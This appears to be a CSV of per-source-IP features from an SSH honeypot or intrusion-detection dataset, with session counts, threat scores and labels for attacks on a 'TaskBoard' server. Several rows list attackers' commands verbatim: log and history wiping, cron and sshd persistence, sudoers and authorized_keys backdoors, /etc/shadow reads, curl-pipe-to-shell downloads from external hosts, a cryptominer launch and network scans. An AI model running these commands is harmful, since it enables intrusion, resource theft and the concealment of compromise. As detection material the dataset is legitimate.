src_ip,total_events,unique_sessions,failed_logins,success_logins,unique_usernames,unique_passwords,unique_dst_ports,unique_protocols,commands_executed,files_downloaded,c2_connections,has_payload,avg_session_duration,total_bytes_sent,total_bytes_received,high_severity_events,medium_severity_events,unique_mitre_techniques,unique_attack_types,compromised_count,commands_list,top_commands,all_commands_unique,unique_commands,suspicious_command_count,uses_downloader,exec_chain_detected,fail_rate,success_rate,user_reuse_ratio,cmd_per_session,bytes_ratio,threat_score,connection_rate,burst_score,anomaly_score,final_label,threat_tier
186.252.88.19,11,1,11,0,7,6,1,1,0,11,11,0,29.0,2799.0,552.0,0,11,1,1,0,[],none,none,0,0,0,0,0.9166666666666666,0.0,0.4166666666666666,0.0,5.061482820976492,5.5,11.0,0.5290722858341116,0.4655441579567345,known_pattern,low
187.126.76.87,5,1,5,0,1,1,1,1,0,5,5,0,9.0,1540.0,272.0,0,5,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,5.641025641025641,5.0,5.0,0.335146942785483,0.4408210021768661,known_pattern,low
188.135.181.36,7,1,7,0,2,3,1,1,0,7,7,0,17.0,602.0,1347.0,0,7,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.75,0.0,0.4465875370919881,5.25,7.0,0.4212257129058606,0.42785192050946186,known_pattern,low
188.69.159.185,10,1,10,0,6,6,1,1,0,10,10,0,13.0,1169.0,304.0,0,10,1,1,0,[],none,none,0,0,0,0,0.9090909090909092,0.0,0.4545454545454546,0.0,3.8327868852459015,5.454545454545454,10.0,0.5413844748741179,0.4151860841212258,known_pattern,low
19.137.2.79,10,1,10,0,5,6,1,1,0,10,10,0,17.0,795.0,672.0,0,10,1,1,0,[],none,none,0,0,0,0,0.9090909090909092,0.0,0.5454545454545454,0.0,1.1812778603268943,5.454545454545454,10.0,0.4701805276105052,0.40430086350222694,known_pattern,low
19.32.247.94,5,1,5,0,1,1,1,1,0,5,5,0,27.0,2817.0,235.0,0,0,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,11.936440677966102,4.166666666666667,5.0,0.450064729817223,0.47472474034738155,known_pattern,low
190.179.163.106,9,1,9,0,5,5,1,1,0,9,9,0,12.0,2069.0,797.0,0,9,1,1,0,[],none,none,0,0,0,0,0.9,0.0,0.5,0.0,2.592731829573935,5.4,9.0,0.6022152187843577,0.4148258313166747,known_pattern,low
190.181.248.114,12,1,12,0,6,7,1,1,0,12,12,0,25.0,469.0,1034.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9230769230769232,0.0,0.5384615384615384,0.0,0.4531400966183574,4.615384615384615,12.0,0.4389909406864742,0.4728856886971259,known_pattern,low
190.197.136.206,25,1,4,21,2,2,1,1,18,25,25,1,632.0,25820.0,50938.0,25,0,1,1,0,"['hostname -f', 'uptime', 'who', 'hostname', 'cat /home/ubuntu/TaskBoard/Backend/middleware/auth.js', 'cat /etc/sudoers', 'node -e ""const mongoose=require(\'mongoose\');mongoose.connect(process.env.MONGO_URI||\'mongodb://localhost/taskboard\');""', 'cd /home/ubuntu/TaskBoard && ls -la', 'cd /home/ubuntu/TaskBoard/Backend && node server.js &', 'export HISTSIZE=0', ""pkill -f 'sshd: root'"", 'rm -f ~/.bash_history', ""echo '' > ~/.bash_history"", 'rm -rf /var/log/syslog', 'rm -rf /var/log/syslog', 'cat /dev/null > ~/.bash_history', 'export HISTFILESIZE=0', 'exit']","rm -rf /var/log/syslog(2), hostname -f(1), uptime(1), who(1), hostname(1)","hostname -f, uptime, who, hostname, cat /home/ubuntu/TaskBoard/Backend/middleware/auth.js, cat /etc/sudoers, node -e ""const mongoose=require('mongoose');mongoose.connect(process.env.MONGO_URI||'mongodb://localhost/taskboard');"", cd /home/ubuntu/TaskBoard && ls -la, cd /home/ubuntu/TaskBoard/Backend && node server.js &, export HISTSIZE=0",17,0,0,0,0.1538461538461538,0.8076923076923077,0.6,9.0,0.506880778970926,6.807692307692308,6.939882114535815,0.1339879492324228,0.5361006739698303,known_pattern,low
192.248.18.193,22,1,4,18,2,2,1,1,16,22,22,0,720.0,61707.0,55408.0,22,0,1,1,0,"['w', 'cat /etc/hostname', 'rm -f ~/.bash_history', 'rm -rf /var/log/auth.log', 'history -c', ""pkill -f 'sshd: root'"", 'export HISTSIZE=0', 'crontab -e', 'systemctl restart sshd', ""echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config"", 'service ssh restart', ""(crontab -l; echo '@reboot /tmp/.sshd &') | crontab -"", 'cat /dev/null > ~/.bash_history', 'export HISTFILESIZE=0', 'truncate -s 0 /var/log/auth.log', 'disconnect']","w(1), cat /etc/hostname(1), rm -f ~/.bash_history(1), rm -rf /var/log/auth.log(1), history -c(1)","w, cat /etc/hostname, rm -f ~/.bash_history, rm -rf /var/log/auth.log, history -c, pkill -f 'sshd: root', export HISTSIZE=0, crontab -e, systemctl restart sshd, echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config",16,1,0,0,0.1739130434782608,0.782608695652174,0.6,8.0,1.1136638452237002,6.782608695652174,8.251701913519662,0.1530530977602606,0.528903561719514,known_pattern,low
194.155.217.222,23,1,5,18,3,3,1,1,15,23,23,1,762.0,19583.0,19013.0,0,23,1,1,0,"['who', 'uname -s -r', 'lsblk', 'df -h', 'dmesg | tail -20', 'ifconfig', 'ss -tulnp', 'ip a', 'cat /etc/resolv.conf', 'ps aux', 'ps aux | grep -v grep', 'cat /proc/1/cmdline', 'find / -perm -4000 -type f 2>/dev/null', 'ls -la /home/ubuntu/TaskBoard', 'exit']","who(1), uname -s -r(1), lsblk(1), df -h(1), dmesg | tail -20(1)","who, uname -s -r, lsblk, df -h, dmesg | tail -20, ifconfig, ss -tulnp, ip a, cat /etc/resolv.conf, ps aux",15,0,0,0,0.2083333333333333,0.75,0.5,7.5,1.0299253181865993,5.833333333333333,9.217328577726123,0.1610294395807364,0.5590870344466595,known_pattern,low
195.254.74.77,11,1,11,0,6,7,1,1,0,11,11,0,13.0,812.0,1361.0,11,0,1,1,0,[],none,none,0,0,0,0,0.9166666666666666,0.0,0.5,0.0,0.5961820851688693,6.416666666666667,11.0,0.5330074766048576,0.4813836394984356,known_pattern,low
197.219.76.252,9,1,9,0,4,4,1,1,0,9,9,0,26.0,2201.0,379.0,0,9,1,1,0,[],none,none,0,0,0,0,0.9,0.0,0.6,0.0,5.792105263157895,5.4,9.0,0.4992702420024519,0.4212683568200551,known_pattern,low
197.98.182.209,24,1,5,19,3,3,1,1,14,24,24,3,627.0,85620.0,27552.0,24,0,1,1,0,"['id', 'cat /etc/os-release', 'uname -s -r', 'last | head -20', 'nproc', 'journalctl -n 50 --no-pager', ""sysctl -a 2>/dev/null | grep -i 'net\\|kernel'"", 'netstat -antp', 'route -n', 'pstree -a', 'top -bn1 | head -20', 'ls -la /home/ubuntu/TaskBoard', 'ls -la /home/ubuntu/TaskBoard/Backend/', 'disconnect']","id(1), cat /etc/os-release(1), uname -s -r(1), last | head -20(1), nproc(1)","id, cat /etc/os-release, uname -s -r, last | head -20, nproc, journalctl -n 50 --no-pager, sysctl -a 2>/dev/null | grep -i 'net\|kernel', netstat -antp, route -n, pstree -a",14,0,0,0,0.2,0.76,0.5,7.0,3.1074656117301203,6.96,8.021301010461114,0.1354825520009814,0.5355963002896639,known_pattern,low
199.196.119.138,9,1,9,0,5,5,1,1,0,9,9,0,14.0,1578.0,711.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9,0.0,0.5,0.0,2.216292134831461,4.5,9.0,0.4817729235053891,0.3965428711367941,known_pattern,low
199.60.12.100,10,1,10,0,6,5,1,1,0,10,10,0,30.0,2299.0,120.0,0,10,1,1,0,[],none,none,0,0,0,0,0.9090909090909092,0.0,0.4545454545454546,0.0,19.0,5.454545454545454,10.0,0.4433274583590097,0.4784046383588302,known_pattern,low
199.65.106.248,11,1,11,0,7,7,1,1,0,11,11,0,25.0,701.0,708.0,0,11,1,1,0,[],none,none,0,0,0,0,0.9166666666666666,0.0,0.4166666666666666,0.0,0.988716502115656,5.5,11.0,0.4604334550965959,0.45094534948295223,known_pattern,low
2.118.25.122,27,1,3,24,1,1,1,1,22,27,27,0,453.0,27428.0,39549.0,0,0,1,1,0,"['who', 'uname -s -r', 'whoami', ""lscpu | grep -E 'CPU|Thread|Core'"", 'dmesg | tail -20', 'lsblk', 'df -h', ""mount | grep -v 'tmpfs\\|cgroup'"", 'netstat -tulnp', 'ip route show', 'ls -la /proc/ | head -20', 'pstree -a', 'ps aux | grep -v grep', 'find / -perm -4000 -type f 2>/dev/null', 'ls -la /home/ubuntu/TaskBoard/Backend/', 'ls /', ""find / -name '*.key' 2>/dev/null | head -10"", ""find /home -name '*.env' 2>/dev/null"", 'truncate -s 0 /var/log/auth.log', 'export HISTFILESIZE=0', 'unset HISTFILE', 'logout']","who(1), uname -s -r(1), whoami(1), lscpu | grep -E 'CPU|Thread|Core'(1), dmesg | tail -20(1)","who, uname -s -r, whoami, lscpu | grep -E 'CPU|Thread|Core', dmesg | tail -20, lsblk, df -h, mount | grep -v 'tmpfs\|cgroup', netstat -tulnp, ip route show",22,1,0,0,0.1071428571428571,0.8571428571428571,0.75,11.0,0.6935018963337547,4.892857142857143,7.842529748361299,0.1563046985052408,0.5999017401494358,suspicious_activity,medium
2.125.101.143,23,1,5,18,3,3,1,1,15,23,23,1,214.0,38769.0,19899.0,23,0,1,1,0,"['w', 'uptime', 'id', 'cat /etc/hostname', 'uname -s -r', 'cat /etc/hosts', 'ip neigh', 'ss -tulnp', ""ssh-keygen -t rsa -b 2048 -f /tmp/id_rsa -N ''"", 'ssh -o StrictHostKeyChecking=no root@10.0.1.50 id', ""nmap -p 22 --open 10.0.0.0/8 -T4 --max-retries 1 2>/dev/null | grep 'Nmap scan'"", ""for i in $(seq 1 254); do ping -c1 -W1 192.168.1.$i &>/dev/null && echo '192.168.1.'$i' alive'; done"", 'masscan 10.0.0.0/8 -p22 --rate=5000 2>/dev/null', 'nmap -sV -p 22,80,443,3306,5432,6379,27017 192.168.0.0/24 2>/dev/null', 'quit']","w(1), uptime(1), id(1), cat /etc/hostname(1), uname -s -r(1)","w, uptime, id, cat /etc/hostname, uname -s -r, cat /etc/hosts, ip neigh, ss -tulnp, ssh-keygen -t rsa -b 2048 -f /tmp/id_rsa -N '', ssh -o StrictHostKeyChecking=no root@10.0.1.50 id",15,0,0,0,0.2083333333333333,0.75,0.5,7.5,1.9481909547738692,6.791666666666667,6.555383489934161,0.1306377676597557,0.5215527855531846,known_pattern,low
20.223.61.191,5,1,5,0,1,1,1,1,0,5,5,0,5.0,2864.0,1161.0,0,5,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,2.4647160068846814,5.0,5.0,0.4629796551322756,0.43927399867416683,known_pattern,low
20.43.221.38,12,1,12,0,8,8,1,1,0,12,12,0,18.0,982.0,1461.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9230769230769232,0.0,0.3846153846153846,0.0,0.6716826265389877,4.615384615384615,12.0,0.4784760980278936,0.511744110877642,known_pattern,low
20.58.45.13,6,1,6,0,2,2,1,1,0,6,6,0,25.0,1789.0,175.0,0,6,1,1,0,[],none,none,0,0,0,0,0.8571428571428571,0.0,0.7142857142857143,0.0,10.164772727272728,5.142857142857143,6.0,0.4333492857785785,0.4388525658554459,known_pattern,low
200.15.249.85,6,1,6,0,2,2,1,1,0,6,6,0,5.0,2275.0,1100.0,6,0,1,1,0,[],none,none,0,0,0,0,0.8571428571428571,0.0,0.7142857142857143,0.0,2.0663033605812897,6.0,6.0,0.4579423025470379,0.42839141842774703,known_pattern,low
200.28.105.131,20,1,3,17,1,1,1,1,14,20,20,1,408.0,41845.0,9716.0,0,0,1,1,0,"['hostname -f', 'uptime', 'lsblk', ""mount | grep -v 'tmpfs\\|cgroup'"", 'journalctl -n 50 --no-pager', ""sysctl -a 2>/dev/null | grep -i 'net\\|kernel'"", 'curl -s http://pool.supportxmr.com/xmrig.tar.gz | tar -xzf - -C /tmp/', 'curl -fsSL http://185.234.219.39/install.sh -o /tmp/install.sh', 'history -c', 'rm -rf /var/log/auth.log', 'truncate -s 0 /var/log/auth.log', 'export HISTSIZE=0', 'export HISTFILESIZE=0', 'logout']","hostname -f(1), uptime(1), lsblk(1), mount | grep -v 'tmpfs\|cgroup'(1), journalctl -n 50 --no-pager(1)","hostname -f, uptime, lsblk, mount | grep -v 'tmpfs\|cgroup', journalctl -n 50 --no-pager, sysctl -a 2>/dev/null | grep -i 'net\|kernel', curl -s http://pool.supportxmr.com/xmrig.tar.gz | tar -xzf - -C /tmp/, curl -fsSL http://185.234.219.39/install.sh -o /tmp/install.sh, history -c, rm -rf /var/log/auth.log",14,3,1,0,0.1428571428571428,0.8095238095238095,0.75,7.0,4.306370278892662,5.142857142857143,7.005131258646959,0.1218353443143666,0.5376574748418412,known_pattern,low
201.13.80.169,10,1,10,0,6,5,1,1,0,10,10,0,29.0,2807.0,1390.0,0,10,1,1,0,[],none,none,0,0,0,0,0.9090909090909092,0.0,0.4545454545454546,0.0,2.0179726815240837,5.454545454545454,10.0,0.4268178746427797,0.43439585184968676,known_pattern,low
201.32.35.19,7,1,7,0,3,3,1,1,0,7,7,0,11.0,1793.0,1025.0,0,0,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.625,0.0,1.7475633528265109,4.375,7.0,0.3811588805280308,0.3996573425182211,known_pattern,low
202.93.90.171,22,1,4,18,2,2,1,1,14,22,22,5,648.0,80214.0,33664.0,0,0,1,1,0,"['uname -a', 'id', 'hostname -f', 'who', 'ls -la /home/ubuntu/TaskBoard/Backend/', 'ls -la /home/ubuntu/TaskBoard', 'curl -fsSL http://185.234.219.39/install.sh -o /tmp/install.sh', '/tmp/payload.sh &', 'wget -q http://45.95.168.200/linpeas.sh -O /tmp/linpeas.sh', 'curl -fsSL http://176.97.66.164/b.sh | sh', 'cat /proc/cpuinfo | grep processor | wc -l', '/tmp/.xmrig -o pool.minexmr.com:4444 -u 47sbtW6oXmVKjwHjExXaAFjNMXuMUEj9VfFRhfJZqU6M9xqN1o2L3c -p x --background', 'unset HISTFILE', 'quit']","uname -a(1), id(1), hostname -f(1), who(1), ls -la /home/ubuntu/TaskBoard/Backend/(1)","uname -a, id, hostname -f, who, ls -la /home/ubuntu/TaskBoard/Backend/, ls -la /home/ubuntu/TaskBoard, curl -fsSL http://185.234.219.39/install.sh -o /tmp/install.sh, /tmp/payload.sh &, wget -q http://45.95.168.200/linpeas.sh -O /tmp/linpeas.sh, curl -fsSL http://176.97.66.164/b.sh | sh",14,3,1,0,0.1739130434782608,0.782608695652174,0.6,7.0,2.3827120154463093,5.478260869565218,7.440937558132324,0.1251868141144914,0.5475872996208505,known_pattern,low
203.99.88.157,10,1,10,0,6,6,1,1,0,10,10,0,12.0,1258.0,385.0,0,10,1,1,0,[],none,none,0,0,0,0,0.9090909090909092,0.0,0.4545454545454546,0.0,3.2590673575129534,5.454545454545454,10.0,0.4865905374701269,0.40775076933934257,known_pattern,low
205.242.18.65,10,1,10,0,6,6,1,1,0,10,10,0,8.0,1676.0,1313.0,10,0,1,1,0,[],none,none,0,0,0,0,0.9090909090909092,0.0,0.4545454545454546,0.0,1.2754946727549468,6.363636363636363,10.0,0.406038455386347,0.454891702491427,known_pattern,low
208.121.229.202,10,1,10,0,5,6,1,1,0,10,10,0,14.0,1566.0,1221.0,0,10,1,1,0,[],none,none,0,0,0,0,0.9090909090909092,0.0,0.5454545454545454,0.0,1.281505728314239,5.454545454545454,10.0,0.5551766631569788,0.41227496891247883,known_pattern,low
208.210.32.161,5,1,5,0,1,1,1,1,0,5,5,0,6.0,1283.0,588.0,5,0,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,2.1782682512733444,5.833333333333333,5.0,0.6148122651858737,0.4619749669801874,known_pattern,low
21.1.47.8,6,1,6,0,2,2,1,1,0,6,6,0,7.0,2623.0,601.0,0,0,1,1,0,[],none,none,0,0,0,0,0.8571428571428571,0.0,0.7142857142857143,0.0,4.357142857142857,4.285714285714286,6.0,0.3514080118154626,0.42232060191076526,known_pattern,low
212.111.56.18,6,1,6,0,2,2,1,1,0,6,6,0,14.0,1117.0,1491.0,0,0,1,1,0,[],none,none,0,0,0,0,0.8571428571428571,0.0,0.7142857142857143,0.0,0.7486595174262735,4.285714285714286,6.0,0.4171533356060807,0.41252831087229735,known_pattern,low
213.182.55.176,19,1,4,15,2,2,1,1,12,19,19,1,352.0,8278.0,16627.0,0,0,1,1,0,"['cat /etc/os-release', 'uptime', 'cat /dev/null > ~/.bash_history', 'unset HISTFILE', 'history -w', 'shred -u /var/log/auth.log', ""echo '' > ~/.bash_history"", 'crontab -e', 'crontab -l', ""sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config"", ""(crontab -l; echo '@reboot /tmp/.sshd &') | crontab -"", 'quit']","cat /etc/os-release(1), uptime(1), cat /dev/null > ~/.bash_history(1), unset HISTFILE(1), history -w(1)","cat /etc/os-release, uptime, cat /dev/null > ~/.bash_history, unset HISTFILE, history -w, shred -u /var/log/auth.log, echo '' > ~/.bash_history, crontab -e, crontab -l, sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config",12,0,0,0,0.2,0.75,0.6,6.0,0.497834977146981,4.85,7.332745856033756,0.131543155862051,0.5316724000030522,known_pattern,low
213.6.127.151,12,1,12,0,6,7,1,1,0,12,12,0,15.0,864.0,389.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9230769230769232,0.0,0.5384615384615384,0.0,2.2153846153846155,4.615384615384615,12.0,0.5166249910265971,0.46960642896198285,known_pattern,low
214.156.6.106,21,1,5,16,3,3,1,1,14,21,21,0,777.0,98327.0,51849.0,21,0,1,1,0,"['id', 'w', 'cat /etc/resolv.conf', 'ss -tulnp', 'ss -antp', 'wget -qO- ipinfo.io', 'ip neigh', ""ssh-keygen -t rsa -b 2048 -f /tmp/id_rsa -N ''"", 'cat /etc/ssh/ssh_known_hosts 2>/dev/null', 'nmap -sV -p 22,80,443,3306,5432,6379,27017 192.168.0.0/24 2>/dev/null', ""for i in $(seq 1 254); do ping -c1 -W1 192.168.1.$i &>/dev/null && echo '192.168.1.'$i' alive'; done"", 'masscan 10.0.0.0/8 -p22 --rate=5000 2>/dev/null', '/tmp/pnscan 172.31.0.0/16 22', 'logout']","id(1), w(1), cat /etc/resolv.conf(1), ss -tulnp(1), ss -antp(1)","id, w, cat /etc/resolv.conf, ss -tulnp, ss -antp, wget -qO- ipinfo.io, ip neigh, ssh-keygen -t rsa -b 2048 -f /tmp/id_rsa -N '', cat /etc/ssh/ssh_known_hosts 2>/dev/null, nmap -sV -p 22,80,443,3306,5432,6379,27017 192.168.0.0/24 2>/dev/null",14,1,1,0,0.2272727272727272,0.7272727272727273,0.5,7.0,1.896374156219865,6.7727272727272725,7.745600068849779,0.149083002839662,0.553993452857571,known_pattern,low
215.105.57.252,10,1,10,0,6,6,1,1,0,10,10,0,19.0,546.0,307.0,10,0,1,1,0,[],none,none,0,0,0,0,0.9090909090909092,0.0,0.4545454545454546,0.0,1.7727272727272727,6.363636363636363,10.0,0.5445531493008656,0.45317107893252445,known_pattern,low
215.30.122.121,5,1,5,0,1,1,1,1,0,5,5,0,20.0,1288.0,1334.0,0,0,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,0.9647940074906368,4.166666666666667,5.0,0.4661770258237473,0.44235967081290223,known_pattern,low
216.47.229.129,5,1,5,0,1,1,1,1,0,5,5,0,15.0,1889.0,923.0,0,5,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,2.044372294372294,5.0,5.0,0.5341172598267562,0.4274404167271915,known_pattern,low
217.138.133.221,6,1,6,0,2,2,1,1,0,6,6,0,17.0,2583.0,1337.0,0,6,1,1,0,[],none,none,0,0,0,0,0.8571428571428571,0.0,0.7142857142857143,0.0,1.9304932735426008,5.142857142857143,6.0,0.4369579289268481,0.4214426313152777,known_pattern,low
217.21.254.68,19,1,3,16,1,1,1,1,13,19,19,2,390.0,52650.0,31820.0,0,0,1,1,0,"['hostname -f', 'who', 'cat /etc/hostname', 'ifconfig', 'curl -s ifconfig.me', 'ssh -o StrictHostKeyChecking=no root@10.0.1.50 id', ""ssh-keygen -t rsa -b 2048 -f /tmp/id_rsa -N ''"", 'nmap -sV -p 22,80,443,3306,5432,6379,27017 192.168.0.0/24 2>/dev/null', '/tmp/pnscan 172.31.0.0/16 22', ""nmap -p 22 --open 10.0.0.0/8 -T4 --max-retries 1 2>/dev/null | grep 'Nmap scan'"", 'masscan 10.0.0.0/8 -p22 --rate=5000 2>/dev/null', ""for i in $(seq 1 254); do ping -c1 -W1 192.168.1.$i &>/dev/null && echo '192.168.1.'$i' alive'; done"", 'quit']","hostname -f(1), who(1), cat /etc/hostname(1), ifconfig(1), curl -s ifconfig.me(1)","hostname -f, who, cat /etc/hostname, ifconfig, curl -s ifconfig.me, ssh -o StrictHostKeyChecking=no root@10.0.1.50 id, ssh-keygen -t rsa -b 2048 -f /tmp/id_rsa -N '', nmap -sV -p 22,80,443,3306,5432,6379,27017 192.168.0.0/24 2>/dev/null, /tmp/pnscan 172.31.0.0/16 22, nmap -p 22 --open 10.0.0.0/8 -T4 --max-retries 1 2>/dev/null | grep 'Nmap scan'",13,1,1,0,0.15,0.8,0.75,6.5,1.6545677382860375,5.05,7.109536757552323,0.125862311443113,0.53755356246352,known_pattern,low
218.154.214.79,9,1,9,0,5,5,1,1,0,9,9,0,5.0,424.0,1468.0,0,9,1,1,0,[],none,none,0,0,0,0,0.9,0.0,0.5,0.0,0.2886317222600408,5.4,9.0,0.4886540730778265,0.42611969551540746,known_pattern,low
218.53.120.20,23,1,5,18,3,3,1,1,15,23,23,1,231.0,33024.0,50595.0,23,0,1,1,0,"['last | head -20', 'uname -a', 'uname -s -r', 'w', 'node -e ""require(\'/home/ubuntu/TaskBoard/Backend/config/db.js\')""', 'env | grep -i secret', ""mongo --eval 'db.adminCommand({listDatabases:1})'"", 'cd /home/ubuntu/TaskBoard/Backend && node server.js &', 'node -e ""const mongoose=require(\'mongoose\');mongoose.connect(process.env.MONGO_URI||\'mongodb://localhost/taskboard\');""', 'cat /dev/null > ~/.bash_history', 'unset HISTFILE', ""pkill -f 'sshd: root'"", 'shred -u /var/log/auth.log', 'export HISTFILESIZE=0', 'exit']","last | head -20(1), uname -a(1), uname -s -r(1), w(1), node -e ""require('/home/ubuntu/TaskBoard/Backend/config/db.js')""(1)","last | head -20, uname -a, uname -s -r, w, node -e ""require('/home/ubuntu/TaskBoard/Backend/config/db.js')"", env | grep -i secret, mongo --eval 'db.adminCommand({listDatabases:1})', cd /home/ubuntu/TaskBoard/Backend && node server.js &, node -e ""const mongoose=require('mongoose');mongoose.connect(process.env.MONGO_URI||'mongodb://localhost/taskboard');"", cat /dev/null > ~/.bash_history",15,1,0,0,0.2083333333333333,0.75,0.5,7.5,0.652699818167444,6.875,8.015426792435296,0.1454819058687368,0.5253155445170036,known_pattern,low
219.116.175.187,5,1,5,0,1,1,1,1,0,5,5,0,10.0,1842.0,434.0,0,5,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,4.23448275862069,5.0,5.0,0.421421605419343,0.4222011058454809,known_pattern,low
22.46.243.161,5,1,5,0,1,1,1,1,0,5,5,0,25.0,395.0,283.0,5,0,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,1.3908450704225352,5.833333333333333,5.0,0.5318321434576059,0.46625534261134227,known_pattern,low
22.63.246.95,12,1,12,0,7,8,1,1,0,12,12,0,17.0,393.0,904.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9230769230769232,0.0,0.4615384615384615,0.0,0.4342541436464088,4.615384615384615,12.0,0.4948186420952931,0.48498101514606967,known_pattern,low
220.65.139.80,7,1,7,0,3,3,1,1,0,7,7,0,20.0,1258.0,755.0,7,0,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.625,0.0,1.664021164021164,6.125,7.0,0.4068206263071522,0.42701079331528763,known_pattern,low
221.192.35.164,10,1,10,0,6,6,1,1,0,10,10,0,12.0,2264.0,512.0,10,0,1,1,0,[],none,none,0,0,0,0,0.9090909090909092,0.0,0.4545454545454546,0.0,4.413255360623782,6.363636363636363,10.0,0.5929243078494187,0.4607938944908605,known_pattern,low
222.142.127.188,25,1,3,22,1,1,1,1,19,25,25,1,237.0,11644.0,48839.0,0,0,1,1,0,"['uname -s -r', 'w', 'hostname -f', 'cat /etc/hostname', 'last | head -20', 'ls /home', 'ls /home/ubuntu/TaskBoard/Backend', 'ls /home/ubuntu/TaskBoard/frontend', 'find /var/tmp -type f 2>/dev/null', 'cat /home/ubuntu/TaskBoard/Backend/routes/auth.js', 'cat /etc/shadow', 'node -e ""require(\'/home/ubuntu/TaskBoard/Backend/config/db.js\')""', 'history', 'set | grep -i pass', 'service sshd restart', ""echo 'root:H4ck3d!' | chpasswd"", ""echo 'backdoor ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"", ""echo 'ssh-rsa AAAA...attacker_key...== root@attacker' >> ~/.ssh/authorized_keys"", 'exit']","uname -s -r(1), w(1), hostname -f(1), cat /etc/hostname(1), last | head -20(1)","uname -s -r, w, hostname -f, cat /etc/hostname, last | head -20, ls /home, ls /home/ubuntu/TaskBoard/Backend, ls /home/ubuntu/TaskBoard/frontend, find /var/tmp -type f 2>/dev/null, cat /home/ubuntu/TaskBoard/Backend/routes/auth.js",19,0,0,0,0.1153846153846153,0.8461538461538461,0.75,9.5,0.2384111384111384,4.884615384615385,6.928342463349068,0.1267482582998447,0.5737764230042799,suspicious_activity,medium
222.234.55.1,12,1,12,0,8,7,1,1,0,12,12,0,27.0,390.0,963.0,12,0,1,1,0,[],none,none,0,0,0,0,0.9230769230769232,0.0,0.3846153846153846,0.0,0.4045643153526971,6.461538461538462,12.0,0.4805223944140757,0.5525740202914159,known_pattern,low
222.74.114.91,8,1,8,0,3,4,1,1,0,8,8,0,23.0,1561.0,261.0,8,0,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.6666666666666667,0.0,5.958015267175573,6.222222222222222,8.0,0.4518436435445476,0.44698422848294694,known_pattern,low
223.178.158.145,10,1,10,0,5,5,1,1,0,10,10,0,15.0,2190.0,182.0,0,10,1,1,0,[],none,none,0,0,0,0,0.9090909090909092,0.0,0.5454545454545454,0.0,11.9672131147541,5.454545454545454,10.0,0.4281200426543036,0.43913177494717026,known_pattern,low
223.20.98.79,9,1,9,0,4,5,1,1,0,9,9,0,19.0,2544.0,1202.0,0,9,1,1,0,[],none,none,0,0,0,0,0.9,0.0,0.6,0.0,2.114713216957606,5.4,9.0,0.5644453132952152,0.4205210361177488,known_pattern,low
223.213.122.190,7,1,7,0,3,3,1,1,0,7,7,0,16.0,1654.0,257.0,0,7,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.625,0.0,6.410852713178294,5.25,7.0,0.4372585855394812,0.40149353106219554,known_pattern,low
